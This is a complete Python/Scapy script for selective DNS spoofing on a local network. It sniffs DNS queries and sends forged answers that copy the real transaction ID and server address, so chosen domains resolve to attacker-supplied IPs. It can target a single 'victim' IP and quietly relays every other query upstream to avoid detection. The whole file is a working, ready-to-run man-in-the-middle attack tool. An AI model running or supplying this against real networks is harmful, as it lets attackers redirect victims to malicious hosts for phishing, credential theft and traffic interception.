#!/usr/bin/env python3
"""
dns_spoof.py

Simple selective DNS spoofer using Scapy.

Usage:
  sudo ./dns_spoof.py -i eth1 --hosts hosts.txt --upstream 8.8.8.8

Features:
 - Listens for DNS queries (UDP/53) on iface
 - If qname matches hosts mapping, send forged DNS reply preserving:
     - DNS transaction ID
     - source/dest IP and ports (swap)
     - Question section
     - correct flags (qr=1, aa=1, rcode=0)
 - If not matched, optionally forward query to upstream DNS and relay reply
 - Logging to stdout and logfile (/tmp/dns_spoof.log)
"""
import argparse
import socket
import logging
from scapy.all import (
    sniff,
    send,
    IP,
    UDP,
    DNS,
    DNSQR,
    DNSRR,
    conf,
    raw,
    get_if_hwaddr,
)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler("/tmp/dns_spoof.log"), logging.StreamHandler()],
)

def load_hosts(hostsfile):
    mapping = {}
    with open(hostsfile, "r") as f:
        for ln in f:
            ln = ln.strip()
            if not ln or ln.startswith("#"):
                continue
            parts = ln.split()
            if len(parts) >= 2:
                mapping[parts[0].strip().lower().rstrip(".")] = parts[1].strip()
    return mapping

def forward_query_and_reply(pkt, upstream_ip, iface):
    """
    Forward the raw DNS packet to upstream and relay reply back to client.
    We use a UDP socket to the upstream server and then craft an IP/UDP packet
    to send the raw response back to the client.
    """
    try:
        client_ip = pkt[IP].src
        client_port = pkt[UDP].sport
        # raw DNS payload from the original packet
        dns_payload = raw(pkt[UDP].payload)
        # send to upstream
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.sendto(dns_payload, (upstream_ip, 53))
        data, _ = s.recvfrom(4096)
        # send response back to client (wrap raw DNS in IP/UDP)
        resp = IP(dst=client_ip, src=pkt[IP].dst) / UDP(dport=client_port, sport=53) / data
        send(resp, iface=iface, verbose=0)
        logging.info(f"Forwarded query for {pkt[DNSQR].qname.decode().rstrip('.')} to {upstream_ip} and relayed reply")
    except Exception as e:
        logging.warning(f"Forwarding failed: {e}")

def craft_and_send_spoof(pkt, target_ip, iface):
    """
    Craft a DNS reply using same transaction ID and question section.
    We set:
       - DNS: id = same, qr=1, aa=1, qdcount=1, ancount=1
       - UDP: sport=53, dport = client's source port
       - IP: src = original dst (so IP appears to come from the server IP), dst = client
    """
    try:
        qname = pkt[DNSQR].qname
    except Exception:
        # no question field
        return

    txid = pkt[DNS].id
    client_ip = pkt[IP].src
    client_port = pkt[UDP].sport
    server_ip = pkt[IP].dst  # claimed server IP in original query (often gateway)
    # Build DNS answer
    answer = DNSRR(rrname=qname, type="A", ttl=300, rdata=target_ip)
    dns = DNS(
        id=txid,
        qr=1,
        aa=1,
        qdcount=1,
        ancount=1,
        qd=pkt[DNS].qd,
        an=answer,
    )
    reply = IP(dst=client_ip, src=server_ip) / UDP(dport=client_port, sport=53) / dns
    send(reply, iface=iface, verbose=0)
    logging.info(f"Spoofed {qname.decode().rstrip('.')} -> {target_ip} for {client_ip}:{client_port}")

def pkt_callback(pkt, hosts_map, upstream, iface, only_from):
    """
    Called for each sniffed packet.
    We only handle UDP/53 DNS queries with a DNSQR question.
    """
    if not pkt.haslayer(UDP) or not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
        return
    # optional filter: only process queries coming from the victim IP range or single IP
    if only_from and pkt[IP].src != only_from:
        return

    # ensure query has question
    if not pkt.haslayer(DNSQR):
        return

    qname = pkt[DNSQR].qname.decode().rstrip(".").lower()
    # exact match then try direct mapping; consider subdomain match? keep exact for safety
    target = hosts_map.get(qname)
    if target:
        craft_and_send_spoof(pkt, target, iface)
    else:
        # not in mapping
        if upstream:
            forward_query_and_reply(pkt, upstream, iface)
        else:
            logging.debug(f"No mapping for {qname}; dropping (no upstream configured)")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iface", required=True, help="Interface to sniff on (e.g., eth1)")
    parser.add_argument("--hosts", required=True, help="Hosts mapping file: domain ip per line")
    parser.add_argument("--upstream", help="Optional upstream DNS server to forward non-target queries")
    parser.add_argument("--victim", help="(optional) only process queries coming from this victim IP")
    args = parser.parse_args()

    conf.verbose = False
    hosts_map = load_hosts(args.hosts)
    logging.info(f"Loaded hosts mapping: {hosts_map}")
    logging.info(f"Listening on {args.iface} for DNS queries; upstream={args.upstream}; victim filter={args.victim}")

    # sniff UDP port 53 packets on the interface
    # BPF filter: UDP dst port 53 OR UDP src port 53 (we only want queries, but restrict to dst port 53)
    bpf = "udp port 53"
    sniff(
        iface=args.iface,
        filter=bpf,
        prn=lambda p: pkt_callback(p, hosts_map, args.upstream, args.iface, args.victim),
        store=0,
    )

if __name__ == "__main__":
    main()
